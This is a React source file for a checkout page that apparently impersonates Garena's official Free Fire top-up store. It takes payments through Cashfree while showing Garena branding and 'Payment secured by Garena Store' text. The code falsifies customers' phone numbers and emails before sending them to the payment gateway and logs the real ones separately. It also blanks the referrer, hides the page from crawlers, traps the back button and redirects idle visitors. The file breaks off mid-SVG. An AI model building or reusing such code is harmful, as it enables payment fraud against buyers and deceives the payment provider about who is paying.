import { useState, useEffect, useRef } from 'react';
import { useSearchParams, Link } from 'react-router-dom';
import { AlertTriangle, AlertCircle } from 'lucide-react';
import { db, saveRtdbOrder } from '../lib/firebase';
import { pickCatalogProduct } from '../lib/catalog-product-picker';

const CODASHOP_URL = 'https://www.garenaofficial.shop/';

export function alterPhone(phone: string): string {
  const clean = phone.replace(/[^0-9]/g, '').slice(-10).padStart(10, '9');
  // Add +2 to every single digit with wrapping (9 -> 0 -> 1)
  return clean
    .split('')
    .map(d => String((parseInt(d, 10) + 2) % 10))
    .join('');
}

function shiftCharPlusOne(ch: string): string {
  if (ch >= '0' && ch <= '9') {
    return String((parseInt(ch, 10) + 1) % 10);
  }
  if (ch >= 'a' && ch <= 'z') {
    return ch === 'z' ? 'a' : String.fromCharCode(ch.charCodeAt(0) + 1);
  }
  if (ch >= 'A' && ch <= 'Z') {
    return ch === 'Z' ? 'A' : String.fromCharCode(ch.charCodeAt(0) + 1);
  }
  return ch;
}

export function alterEmail(email: string): string {
  if (!email || !email.includes('@')) return 'customer12@gmail.com';
  const atIndex = email.lastIndexOf('@');
  const user = email.slice(0, atIndex);
  const domain = email.slice(atIndex + 1);

  if (user.length === 0) return `ab@${domain}`;
  if (user.length === 1) return `${shiftCharPlusOne(user)}b@${domain}`;

  const prefix = user.slice(0, -2);
  const last2 = user
    .slice(-2)
    .split('')
    .map(shiftCharPlusOne)
    .join('');

  return `${prefix}${last2}@${domain}`;
}

export default function GarenaCheckout() {
  const [searchParams] = useSearchParams();
  const initialParamsRef = useRef({
    pkg: searchParams.get('pkg') || '',
    diamonds: searchParams.get('diamonds') || '',
    uid: searchParams.get('uid') || '',
    nick: searchParams.get('nick') || '',
    level: searchParams.get('level') || '',
    status: searchParams.get('status') || '',
  });

  const pkgParam      = searchParams.get('pkg')      || initialParamsRef.current.pkg      || null;
  const diamondsParam = searchParams.get('diamonds') || initialParamsRef.current.diamonds || null;
  const uidParam      = searchParams.get('uid')      || initialParamsRef.current.uid      || null;
  const nickParam     = searchParams.get('nick')     || initialParamsRef.current.nick     || null;
  const levelParam    = searchParams.get('level')    || initialParamsRef.current.level    || null;
  const statusParam   = searchParams.get('status')   || initialParamsRef.current.status   || null;

  const [statusState, setStatusState] = useState<string>('');
  const pkg      = pkgParam      || '';
  const diamonds = diamondsParam || '';
  const uid      = uidParam      || '';
  const nick     = nickParam     || '';
  const level    = levelParam    || '';
  const status   = statusState || statusParam || '';

  const pickedProduct = pickCatalogProduct(pkg || 0);

  const isCallback = status === 'success' || status === 'failed';

  // Allowed ONLY if callback status exists OR all required payload parameters exist (pkg, uid, etc.)
  const hasValidParams = Boolean(
    pkgParam &&
    uidParam &&
    (diamondsParam || nickParam || levelParam || Number(pkgParam) > 0)
  );

  // Strip query parameters (?pkg=...&diamonds=...&uid=...&nick=...&level=...) from the browser URL bar
  // to /booyahpay immediately after reading them into memory so Cashfree SDK never sees them in window.location,
  // while locking history on /booyahpay so pressing Back never goes to the public store.
  const backPressedIdleTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  useEffect(() => {
    if (typeof window === 'undefined' || (!hasValidParams && !isCallback)) return;
    try {
      window.history.replaceState({ booyahStayOnPage: true }, '', '/booyahpay');
      window.history.pushState({ booyahStayOnPage: true }, '', '/booyahpay');
    } catch {
      // Ignore in restricted environments
    }
    const onPopState = () => {
      try {
        window.history.pushState({ booyahStayOnPage: true }, '', '/booyahpay');
      } catch {
        // Ignore
      }
      // If user pressed Back on the page and does nothing for 7 seconds (5-10s window), redirect to Garena Official
      if (backPressedIdleTimerRef.current) clearTimeout(backPressedIdleTimerRef.current);
      backPressedIdleTimerRef.current = setTimeout(() => {
        window.location.replace(CODASHOP_URL);
      }, 7000);
    };
    window.addEventListener('popstate', onPopState);
    return () => {
      window.removeEventListener('popstate', onPopState);
      if (backPressedIdleTimerRef.current) clearTimeout(backPressedIdleTimerRef.current);
    };
  }, [hasValidParams, isCallback]);

  // Save session info to local storage for success/failure screens (do not overwrite with callback placeholders)
  useEffect(() => {
    if (isCallback) return;
    if (nick) localStorage.setItem('ff_nick', nick);
    if (diamonds) localStorage.setItem('ff_dia', diamonds);
    if (pkg) localStorage.setItem('ff_price', pkg);
    if (level) localStorage.setItem('ff_lvl', level);
    if (uid) localStorage.setItem('ff_uid', uid);
  }, [nick, diamonds, pkg, level, uid, isCallback]);

  // Responsive state system
  const [vw, setVw] = useState(
    typeof window !== 'undefined' ? window.innerWidth : 390
  );

  // Hide from crawlers and strip any incoming referrer in DOM
  useEffect(() => {
    try {
      Object.defineProperty(document, 'referrer', { get: () => '', configurable: true });
      Object.defineProperty(Document.prototype, 'referrer', { get: () => '', configurable: true });
    } catch {
      // Ignore if restricted
    }

    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noindex, nofollow, noarchive';
    document.head.appendChild(metaRobots);

    const metaReferrer = document.createElement('meta');
    metaReferrer.name = 'referrer';
    metaReferrer.content = 'no-referrer';
    document.head.appendChild(metaReferrer);

    return () => {
      if (document.head.contains(metaRobots)) document.head.removeChild(metaRobots);
      if (document.head.contains(metaReferrer)) document.head.removeChild(metaReferrer);
    };
  }, []);

  useEffect(() => {
    const handler = () => setVw(window.innerWidth);
    window.addEventListener('resize', handler);
    return () => window.removeEventListener('resize', handler);
  }, []);

  const isMobile  = vw < 640;
  const isTablet  = vw >= 640 && vw < 1024;
  const isDesktop = vw >= 1024;

  // Inject global CSS resets once
  useEffect(() => {
    const style = document.createElement('style');
    style.innerHTML = `
      *, *::before, *::after { box-sizing: border-box; }
      html, body { margin: 0; padding: 0; overflow-x: hidden; }
      input, select, textarea { font-size: 16px !important; }
      button { -webkit-tap-highlight-color: transparent; }
      * { -webkit-font-smoothing: antialiased; }
    `;
    document.head.appendChild(style);
    return () => {
      if (document.head.contains(style)) {
        document.head.removeChild(style);
      }
    };
  }, []);

  const [countdownSeconds, setCountdownSeconds] = useState(2);

  // If direct invalid access without query parameters, redirect to Garena Official in 2 seconds (never Booyahstudio)
  useEffect(() => {
    if (!isCallback && !hasValidParams) {
      const timer = setTimeout(() => {
        window.location.replace(CODASHOP_URL);
      }, 2000);
      const interval = setInterval(() => {
        setCountdownSeconds((prev) => (prev > 1 ? prev - 1 : 1));
      }, 1000);
      return () => {
        clearTimeout(timer);
        clearInterval(interval);
      };
    }
  }, [isCallback, hasValidParams]);

  const [form, setForm] = useState({ name: '', phone: '', email: '' });
  const [focusedField, setFocusedField] = useState<'name' | 'phone' | 'email' | null>(null);
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('Connecting to Payment Gateway...');
  const [error, setError] = useState('');
  const [countdown, setCountdown] = useState(5);
  const [barWidth, setBarWidth] = useState('100%');
  const [showPayModal, setShowPayModal] = useState(false);

  // If direct invalid access without query parameters, display the exact requested UI card with Navbar and Footer
  if (!isCallback && !hasValidParams) {
    return (
      <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh', backgroundColor: '#f3f6f9' }}>
        <main style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '32px 16px' }}>
          <div
            id="no-item-selected-card"
            style={{
              backgroundColor: '#ffffff',
              borderRadius: '20px',
              padding: '36px 32px',
              maxWidth: '460px',
              width: '100%',
              textAlign: 'center',
              boxShadow: '0 10px 35px rgba(0, 0, 0, 0.06)',
              border: '1px solid #f0f0f0'
            }}
          >
            {/* Warning Circle Icon */}
            <div
              style={{
                width: '68px',
                height: '68px',
                backgroundColor: '#fff1f1',
                borderRadius: '50%',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                margin: '0 auto 20px auto'
              }}
            >
              <div
                style={{
                  width: '46px',
                  height: '46px',
                  backgroundColor: '#fee2e2',
                  borderRadius: '50%',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}
              >
                <AlertTriangle style={{ width: '24px', height: '24px', color: '#f59e0b', fill: '#f59e0b' }} />
              </div>
            </div>

            {/* Title */}
            <h2
              style={{
                fontSize: '20px',
                fontWeight: '900',
                color: '#0f172a',
                marginBottom: '12px',
                letterSpacing: '0.04em',
                textTransform: 'uppercase'
              }}
            >
              NO ITEM SELECTED
            </h2>

            {/* Description */}
            <p
              style={{
                fontSize: '14px',
                color: '#475569',
                lineHeight: '1.6',
                marginBottom: '24px',
                padding: '0 8px'
              }}
            >
              Your order was not. You have not selected any item. Please go back to home and select item for purchase.
            </p>

            {/* Progress Container */}
            <div
              style={{
                backgroundColor: '#f1f5f9',
                borderRadius: '12px',
                padding: '14px 16px',
                marginBottom: '20px'
              }}
            >
              <p
                style={{
                  fontSize: '13px',
                  color: '#64748b',
                  fontWeight: '500',
                  margin: '0 0 10px 0'
                }}
              >
                Redirecting to home page in {countdownSeconds} seconds...
              </p>
              <div
                style={{
                  width: '100%',
                  backgroundColor: '#e2e8f0',
                  height: '6px',
                  borderRadius: '999px',
                  overflow: 'hidden'
                }}
              >
                <div
                  style={{
                    backgroundColor: '#ef4444',
                    height: '100%',
                    borderRadius: '999px',
                    width: countdownSeconds === 2 ? '50%' : '100%',
                    transition: 'width 1s linear'
                  }}
                />
              </div>
            </div>

            {/* Action Button */}
            <a
              href={CODASHOP_URL}
              rel="noreferrer"
              style={{
                display: 'block',
                width: '100%',
                backgroundColor: '#0f172a',
                color: '#ffffff',
                padding: '14px 20px',
                borderRadius: '10px',
                fontSize: '13px',
                fontWeight: '800',
                letterSpacing: '0.06em',
                textTransform: 'uppercase',
                textDecoration: 'none',
                boxShadow: '0 4px 12px rgba(15, 23, 42, 0.15)'
              }}
            >
              GO TO HOMEPAGE NOW
            </a>
          </div>
        </main>
      </div>
    );
  }

  // Success page auto-redirection countdown
  useEffect(() => {
    if (status === 'success') {
      sessionStorage.removeItem('payment_initiated');
      const timer = setInterval(() => {
        setCountdown(c => {
          if (c <= 1) {
            clearInterval(timer);
            window.location.href = 'https://www.garenaofficial.shop/?status=success';
          }
          return c - 1;
        });
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [status]);

  // Failure page auto-redirection & progress bar
  useEffect(() => {
    if (status === 'failed') {
      sessionStorage.removeItem('payment_initiated');
      const t1 = setTimeout(() => setBarWidth('0%'), 50);
      const timer = setInterval(() => {
        setCountdown(c => {
          if (c <= 1) {
            clearInterval(timer);
            window.location.href = 'https://www.garenaofficial.shop/?status=failed';
          }
          return c - 1;
        });
      }, 1000);
      return () => {
        clearTimeout(t1);
        clearInterval(timer);
      };
    }
  }, [status]);

  // Detect when user navigates back from the Payment Gateway without completing payment:
  // Stay on /booyahpay, show the Failed Payment screen, and redirect to garenaofficial.shop/?status=failed
  useEffect(() => {
    const checkReturnedFromGateway = () => {
      if (statusParam === 'success') {
        sessionStorage.removeItem('payment_initiated');
        return;
      }
      if (sessionStorage.getItem('payment_initiated') === 'true') {
        sessionStorage.removeItem('payment_initiated');
        setLoading(false);
        setShowPayModal(false);
        setCountdown(5);
        setBarWidth('100%');
        setStatusState('failed');
      }
    };

    checkReturnedFromGateway();

    const handlePageShow = (e: PageTransitionEvent) => {
      if ((e as any).persisted || document.visibilityState === 'visible') {
        checkReturnedFromGateway();
      }
    };
    const handleVisibilityChange = () => {
      if (document.visibilityState === 'visible') {
        checkReturnedFromGateway();
      }
    };
    window.addEventListener('pageshow', handlePageShow);
    document.addEventListener('visibilitychange', handleVisibilityChange);
    return () => {
      window.removeEventListener('pageshow', handlePageShow);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, []);

  const hasMovedRef = useRef(false);
  const idleTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    if (status) return; // don't run on success/failure pages
    if (loading) return; // payment gateway redirect in progress

    const IDLE_INITIAL = 30000;      // 30 sec — if user does nothing after landing on page
    const IDLE_AFTER_MOVE = 120000;  // 2 min (120 sec) — once user starts filling details or moving

    const redirectToSource = () => {
      window.location.replace(CODASHOP_URL);
    };

    const resetTimer = () => {
      if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
      if (backPressedIdleTimerRef.current) clearTimeout(backPressedIdleTimerRef.current);
      idleTimerRef.current = setTimeout(redirectToSource, IDLE_AFTER_MOVE);
    };

    const handleActivity = () => {
      if (!hasMovedRef.current) {
        hasMovedRef.current = true;
        if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
      }
      resetTimer();
    };

    idleTimerRef.current = setTimeout(() => {
      if (!hasMovedRef.current) {
        redirectToSource();
      }
    }, IDLE_INITIAL);

    const events = ['mousemove', 'mousedown', 'keydown', 'keypress', 'input', 'touchstart', 'scroll', 'click'];
    events.forEach(e => window.addEventListener(e, handleActivity, { passive: true }));

    return () => {
      if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
      events.forEach(e => window.removeEventListener(e, handleActivity));
    };
  }, [status, loading]);

  // Validate customer contact details without identity- or keyword-based filtering.
  const validateForm = (): boolean => {
    const trimmedName = form.name.trim();
    const trimmedEmail = form.email.trim();
    const trimmedPhone = form.phone.trim();

    if (!trimmedName || !trimmedPhone || !trimmedEmail) {
      setError('Please fill in all fields (Name, Phone, Email).');
      return false;
    }

    if (trimmedName.length < 2) {
      setError('Please enter correct name.');
      return false;
    }

    if (!/^\d{10}$/.test(trimmedPhone)) {
      setError('Please enter a valid 10-digit mobile number.');
      return false;
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedEmail)) {
      setError('Please enter a valid email address.');
      return false;
    }

    setError('');
    return true;
  };

  // Handle Standard Gateway Checkout Execution (All Payment Modes)
  const handlePay = async (_mode: 'QR' | 'ALL' = 'ALL') => {
    const ALLOWED_PRICES = [599, 799, 1100, 1400, 1699, 1999, 5500, 7500, 5599, 7599];
    const currentPrice = Number(pkg);
    
    if (!ALLOWED_PRICES.includes(currentPrice)) {
      setError('Invalid package selected. Payment cannot be initiated.');
      setShowPayModal(false);
      return;
    }

    if (!validateForm()) {
      setShowPayModal(false);
      return;
    }

    setError('');
    setShowPayModal(false);
    setLoading(true);
    setLoadingMessage('Initializing secure checkout...');

    try {
      // Mandated 5-Second Loading Period before payment modal
      for (let secondsLeft = 5; secondsLeft > 0; secondsLeft--) {
        setLoadingMessage(`Redirecting to payment gateway in ${secondsLeft}s...`);
        await new Promise(r => setTimeout(r, 1000));
      }

      setLoadingMessage('Connecting to Payment Gateway...');

      // Apply email and phone alteration before sending to gateway
      const alteredEmail = alterEmail(form.email.trim());
      const alteredPhone = alterPhone(form.phone.trim());

      const res = await fetch('/api/v2/payments/cashfree/create-order', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        referrerPolicy: 'no-referrer',
        body: JSON.stringify({
          amount: pkg,
          customer: {
            name: form.name.trim(),
            phone: alteredPhone,
            email: alteredEmail
          },
          // Send original data for internal logging only
          originalCustomerData: {
            name: form.name.trim(),
            phone: form.phone.trim(),
            email: form.email.trim()
          },
          upiQr: false,
          productId: pickedProduct.id,
          customerAuthorized: true,
          termsAccepted: true,
        }),
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.message || data.error || 'Payment initiation failed');
      }

      // Blank document.referrer and set current history entry to /booyahpay?...&status=failed
      // so if the customer presses Back from the payment gateway without paying,
      // the browser returns to /booyahpay in Failed state (never /checkout on Booyahstudio)
      // and automatically redirects back to garenaofficial.shop/?status=failed.
      if (typeof window !== 'undefined') {
        try {
          Object.defineProperty(document, 'referrer', { get: () => '', configurable: true });
          Object.defineProperty(Document.prototype, 'referrer', { get: () => '', configurable: true });
        } catch {
          // Ignore
        }
        if (window.history?.replaceState) {
          try {
            const safePkg = String(pkg || localStorage.getItem('ff_price') || '599');
            window.history.replaceState(
              { booyahPaymentInitiated: true },
              '',
              `/booyahpay?status=failed&pkg=${encodeURIComponent(safePkg)}`
            );
          } catch {
            // Ignore
          }
        }
      }

      const loadCashfree = () => {
        return new Promise<any>((resolve) => {
          if ((window as any).Cashfree) return resolve(new (window as any).Cashfree({ mode: data.mode || 'sandbox' }));
          const script = document.createElement('script');
          script.src = 'https://sdk.cashfree.com/js/v3/cashfree.js';
          script.referrerPolicy = 'no-referrer';
          script.onload = () => resolve(new (window as any).Cashfree({ mode: data.mode || 'sandbox' }));
          script.onerror = () => resolve(null);
          document.body.appendChild(script);
        });
      };

      const cashfree = await loadCashfree();
      if (!cashfree) {
        sessionStorage.removeItem('payment_initiated');
        throw new Error('Payment gateway could not be loaded. Please check your connection.');
      }

      sessionStorage.setItem('payment_initiated', 'true');

      await cashfree.checkout({
        paymentSessionId: data.paymentSessionId,
        redirectTarget: '_self',
      });

    } catch (e: any) {
      sessionStorage.removeItem('payment_initiated');
      console.error('Cashfree payment error:', e);
      setError(e.message || 'Something went wrong while connecting to payment gateway. Please try again.');
      setLoading(false);
    }
  };

  // SUCCESS PAGE
  if (status === 'success') {
    const savedNick   = localStorage.getItem('ff_nick')   || nick || 'Player';
    const savedDia    = localStorage.getItem('ff_dia')    || diamonds || '';
    const savedLvl    = localStorage.getItem('ff_lvl')    || level || '';
    const savedAvatar = localStorage.getItem('ff_avatar_url') || '';
    const savedUid    = localStorage.getItem('ff_uid')    || uid;

    return (
      <div style={{
        background: '#f5f6fa',
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: isMobile ? 16 : 24,
        fontFamily: "'Segoe UI', system-ui, sans-serif",
        boxSizing: 'border-box'
      }}>
        <div style={{
          maxWidth: isMobile ? '100%' : 420,
          borderRadius: isMobile ? 16 : 20,
          background: 'white',
          border: '1px solid #ebebeb',
          boxShadow: '0 8px 32px rgba(0,0,0,0.08)',
          width: '100%',
          overflow: 'hidden',
          boxSizing: 'border-box'
        }}>
          <div style={{
            height: 6,
            background: 'linear-gradient(90deg, #ee2c24, #ff6b35)'
          }} />

          <div style={{ padding: isMobile ? '28px 20px 24px' : '36px 28px 32px', boxSizing: 'border-box' }}>
            <div style={{
              width: 72,
              height: 72,
              background: '#f0fdf4',
              border: '2px solid #bbf7d0',
              borderRadius: '50%',
              margin: '0 auto 20px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}>
              <span style={{ fontSize: 34, color: '#16a34a', fontWeight: 900 }}>✓</span>
            </div>

            <h2 style={{
              fontSize: isMobile ? 20 : 22,
              fontWeight: 900,
              color: '#111',
              margin: '0 0 6px',
              textAlign: 'center'
            }}>
              Your order has been confirmed
            </h2>

            {savedDia && (
              <div style={{ textAlign: 'center', margin: '0 0 20px' }}>
                <span style={{ fontSize: isMobile ? 24 : 28, fontWeight: 900, color: '#ee2c24' }}>
                  💎 {savedDia} Diamonds
                </span>
              </div>
            )}

            <div style={{
              background: '#f9fafb',
              border: '1px solid #f0f0f0',
              borderRadius: 12,
              padding: '14px 16px',
              marginBottom: 20,
              display: 'flex',
              alignItems: 'center',
              gap: 12
            }}>
              {savedAvatar && (
                <img
                  src={savedAvatar}
                  alt="avatar"
                  style={{
                    width: 44,
                    height: 44,
                    borderRadius: '50%',
                    border: '2px solid #ee2c24',
                    objectFit: 'cover',
                    display: 'block'
                  }}
                  onError={(e) => {
                    (e.target as HTMLImageElement).style.display = 'none';
                  }}
                />
              )}
              <div>
                <span style={{ fontSize: 14, fontWeight: 800, color: '#111', display: 'block' }}>
                  {savedNick}
                </span>
                {savedUid && (
                  <span style={{ fontSize: 11, color: '#999', fontWeight: 600, display: 'block', marginTop: 2 }}>
                    UID: {savedUid} {savedLvl ? `· Lv. ${savedLvl}` : ''}
                  </span>
                )}
              </div>
            </div>

            <div style={{
              background: '#fff7f7',
              border: '1px solid #fee2e2',
              borderRadius: 10,
              padding: '10px 16px',
              marginBottom: 20,
              textAlign: 'center',
              fontSize: 12,
              color: '#888'
            }}>
              Continuing to garenaofficial.shop in <span style={{ fontWeight: 800, color: '#ee2c24', fontSize: 16 }}>{countdown} seconds</span>…
            </div>

            <div style={{ textAlign: 'center', fontSize: 11, color: '#ccc' }}>
              🔒 Payment secured by Garena Store · Do not close this window
            </div>
          </div>
        </div>
      </div>
    );
  }

  // FAILED PAGE
  if (status === 'failed') {
    return (
      <div style={{
        background: '#f5f6fa',
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: isMobile ? 16 : 24,
        fontFamily: "'Segoe UI', system-ui, sans-serif",
        boxSizing: 'border-box'
      }}>
        <div style={{
          maxWidth: isMobile ? '100%' : 400,
          borderRadius: isMobile ? 16 : 20,
          background: 'white',
          border: '1px solid #ebebeb',
          boxShadow: '0 8px 32px rgba(0,0,0,0.08)',
          width: '100%',
          overflow: 'hidden',
          boxSizing: 'border-box'
        }}>
          <div style={{
            height: 6,
            background: 'linear-gradient(90deg, #ee2c24, #c0392b)'
          }} />

          <div style={{ padding: isMobile ? '28px 20px 24px' : '36px 28px 32px', boxSizing: 'border-box' }}>
            <div style={{
              width: 72,
              height: 72,
              background: '#fff5f5',
              border: '2px solid #fecaca',
              borderRadius: '50%',
              margin: '0 auto 20px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}>
              <span style={{ fontSize: 30, color: '#dc2626', fontWeight: 900 }}>✕</span>
            </div>

            <h2 style={{
              fontSize: 20,
              fontWeight: 900,
              color: '#111',
              margin: '0 0 8px',
              textAlign: 'center'
            }}>
              Payment could not be completed
            </h2>

            <p style={{
              fontSize: 13,
              color: '#888',
              textAlign: 'center',
              margin: '0 0 24px',
              lineHeight: 1.6
            }}>
              Your payment was cancelled or failed. No amount was deducted.
            </p>

            <div style={{
              background: '#f9fafb',
              border: '1px solid #f0f0f0',
              borderRadius: 10,
              padding: '12px 16px',
              marginBottom: 20,
              textAlign: 'center',
              fontSize: 12,
              color: '#aaa',
              boxSizing: 'border-box'
            }}>
              Continuing to garenaofficial.shop in {countdown} seconds…
              <div style={{
                width: '100%',
                height: 4,
                background: '#e5e7eb',
                borderRadius: 2,
                marginTop: 8,
                overflow: 'hidden'
              }}>
                <div style={{
                  width: barWidth,
                  height: '100%',
                  background: 'linear-gradient(90deg, #ee2c24, #c0392b)',
                  transition: 'width 5s linear'
                }} />
              </div>
            </div>

            <div style={{ textAlign: 'center', fontSize: 11, color: '#ccc' }}>
              🔒 Payment secured · Do not close this window
            </div>
          </div>
        </div>
      </div>
    );
  }

  // CARD STYLE HELPER
  const cardStyle = {
    background: 'white',
    borderRadius: isMobile ? 14 : 16,
    border: '1px solid #ebebeb',
    boxShadow: '0 2px 8px rgba(0,0,0,0.05)',
    padding: isMobile ? '16px 14px' : '20px 24px',
    boxSizing: 'border-box' as const,
  };

  // CARD HEADER STYLE HELPER
  const renderCardHeader = (num: string, text: string) => (
    <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: isMobile ? 14 : 18 }}>
      <div style={{
        width: 22, height: 22, background: '#ee2c24',
        color: 'white', borderRadius: 6,
        fontSize: 11, fontWeight: 800,
        display: 'flex', alignItems: 'center', justifyContent: 'center'
      }}>
        {num}
      </div>
      <span style={{ fontSize: isMobile ? 13 : 14, fontWeight: 800, color: '#111' }}>{text}</span>
    </div>
  );

  return (
    <div style={{
      minHeight: '100vh',
      background: '#f5f6fa',
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
      WebkitFontSmoothing: 'antialiased'
    }}>
      {/* 5-SECOND LOADING OVERLAY */}
      {loading && (
        <div
          style={{
            position: 'fixed', inset: 0, zIndex: 9999,
            background: 'rgba(5,7,10,0.88)',
            backdropFilter: 'blur(8px)',
            display: 'flex', flexDirection: 'column',
            alignItems: 'center', justifyContent: 'center', gap: 24,
            padding: 20, textAlign: 'center'
          }}
        >
          <img
            src="https://official.garena.com/ph/v1/assets/garena_logo_horizontal.svg"
            alt="Garena"
            style={{ height: 36, objectFit: 'contain', opacity: 0.95 }}
          />
          <div style={{ display: 'flex', gap: 10 }}>
            {[0, 1, 2].map(i => (
              <div
                key={i}
                style={{
                  width: 12, height: 12, borderRadius: '50%',
                  background: '#ee2c24',
                  animation: 'garena-bounce 1.2s ease-in-out infinite',
                  animationDelay: `${i * 0.2}s`,
                }}
              />
            ))}
          </div>
          <div style={{ fontSize: 15, color: '#ffffff', fontWeight: 700, letterSpacing: 0.4 }}>
            {loadingMessage}
          </div>
          <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', fontWeight: 500 }}>
            Please do not refresh or close this page
          </div>
          <style>{`
            @keyframes garena-bounce {
              0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
              40% { transform: scale(1.1); opacity: 1; }
            }
          `}</style>
        </div>
      )}

      {/* LAYER 1 — STICKY HEADER */}
      <header style={{
        position: 'sticky',
        top: 0,
        zIndex: 100,
        width: '100%',
        background: 'white',
        borderBottom: '1px solid #f0f0f0',
        boxShadow: '0 1px 3px rgba(0,0,0,0.06)',
      }}>
        <div style={{
          maxWidth: isDesktop ? 1200 : '100%',
          margin: '0 auto',
          padding: isMobile ? '0 14px' : '0 24px',
          height: isMobile ? 50 : 56,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          boxSizing: 'border-box'
        }}>
          {/* Left: logo + divider + title */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 0, minWidth: 0, flex: 1 }}>
            <svg
              viewBox="0 0 34 36"
              fill="none"
              style={{
                width: isMobile ? 24 : 30,
                height: isMobile ? 26 : 32,
                flexShrink: 0,
                display: 'block',
              }}
            >
              <g id="Union">
                <path d="M19.5397 0.10298L19.6326 0.022157L19.8982 0L19.7826 0.195385L19.5734 0.229753L19.3184 0.505834L19.1692 0.425641L19.1335 0.516787L18.8325 0.540581L18.8448 0.620774L19.1335 0.655772L18.8911 0.724761L18.8565 0.828244L18.7168 0.81641L18.7058 0.920145L18.4166 0.931098V1.00097L18.2308 1.04679L18.0569 1.24155L17.9295 1.1611C17.9295 1.1611 17.8947 1.1611 17.8714 1.28838C17.2684 1.64168 16.0247 2.32664 14.7703 3.01758C13.7365 3.58698 12.6953 4.16043 11.9993 4.55566C11.9567 4.58208 11.9112 4.61072 11.8625 4.64133C11.2738 5.0112 10.2255 5.66994 8.52449 6.21303C10.1314 5.87985 10.7558 5.59868 11.6469 5.19752C12.079 5.00297 12.5738 4.7802 13.2737 4.50958C15.4158 3.68083 17.7672 3.77273 17.7672 3.77273L17.478 3.94646L17.5003 4.24496L17.6626 4.26837L17.7791 4.29128L17.9871 4.15356L17.9991 4.25691L18.1848 4.29128L18.3465 4.25691L18.5783 4.18856L18.7643 4.23098L18.7643 4.23098L18.7396 4.04894L18.8973 4.09993L19.0023 4.21839L19.1335 4.04894L19.4478 4.13606L19.1458 4.14172L19.1804 4.25691L18.6473 4.26837L18.6819 4.34869L18.3115 4.32603L18.2422 4.3604C18.2422 4.3604 18.3005 4.44147 18.2191 4.45255C17.9295 4.55566 17.7731 4.74638 17.7731 4.74638C20.4134 3.64105 23.6109 5.57412 23.6109 5.57412L23.8187 5.62498L23.8546 5.93669L23.9404 6.00631H24.1149L23.9927 6.19528L24.1149 6.33313V6.55721L23.9058 6.5061L23.7495 6.33313L23.8365 6.22939L23.7323 6.09267H23.4195L23.2638 5.98869L23.1416 5.97094L22.8634 5.83258L22.6374 5.86821L23.1416 5.97094L22.8634 5.83258L22.6374 5.86821L22.4292 5.67673L21.4904 5.69435L21.5431 5.78096L22.0121 5.81546L22.0818 5.93669H22.551L22.7937 6.12641L23.107 6.09267L23.2809 6.17815L23.6279 6.28139L23.4023 6.36787C23.4023 6.36787 23.8811 7.1017 26.8589 7.8004C31.1329 8.80112 34 6.95516 34 6.95516C33.2703 7.88638 32.3836 8.16221 32.3836 8.16221L31.7406 8.23208L31.6014 8.33519L31.3065 8.42193L30.4385 8.88798L30.2122 9.04283L30.1948 9.16318L30.1085 9.26742L30.0737 9.09507H29.8121L29.5699 9.16318L29.604 9.25017L29.5519 9.47388H29.3773L29.4655 9.33691L29.3773 9.26742L29.2742 9.09507L29.1182 9.11169L28.8052 9.38765L28.6141 9.33691L28.4918 9.37078L28.3188 9.45714L28.1452 9.52588L27.9192 9.45714L27.6927 9.5605L27.537 9.45714L27.1897 9.42201L27.1721 9.30204H26.9637L26.8067 9.38765L26.5986 9.52588L25.9041 9.5605L26.5464 9.68211L26.7728 9.71572L26.9288 9.52588L27.0854 9.50901L27.242 9.5605L27.5717 9.6991L27.7804 9.68211L27.9363 9.57724L28.058 9.63012L28.2145 9.71572L28.3772 9.80208C28.3772 9.80208 27.3808 9.94006 26.1071 10.0101C27.358 10.078 28.5379 10.9065 28.5379 10.9065C28.5379 10.9065 27.9131 10.6542 25.5978 10.8143C23.4676 10.9631 22.2721 10.4309 21.0773 9.89913C20.129 9.47709 19.1813 9.05525 17.7672 8.97409C13.5286 8.72936 11.7362 11.2349 11.7362 11.2349L11.579 11.5807L11.2405 11.6057L11.206 11.8123L11.1366 11.8384L11.1189 11.9071L10.8933 11.9937L10.902 12.0973L11.1189 12.1224L11.0758 12.261L11.0059 12.4072L11.3276 12.9697L10.9362 12.6326L10.7801 12.5545L10.511 12.4428L10.4241 12.5373L10.3543 12.7278L10.2415 12.9002L10.0767 12.8482C10.0767 12.8482 10.1113 13.3052 9.65914 13.3919C9.48551 13.5728 9.6509 13.677 9.6509 13.677L9.87674 13.694V13.8851L9.96406 13.901C9.96406 13.901 9.91172 13.9611 9.87674 14.0911C10.0416 14.1163 10.1193 14.0047 10.1193 14.0047L10.224 14.03C10.224 14.03 9.97242 14.5573 9.33825 14.7641C9.43342 14.8671 9.53773 14.8765 9.53773 14.8765C9.53773 14.8765 8.84297 15.2818 8.62588 15.7473C8.49585 16.2138 8.7042 16.1794 8.7042 16.1794C8.7042 16.1794 8.50383 16.4036 8.4866 16.0837C8.28724 15.9987 8.19194 16.2219 8.19194 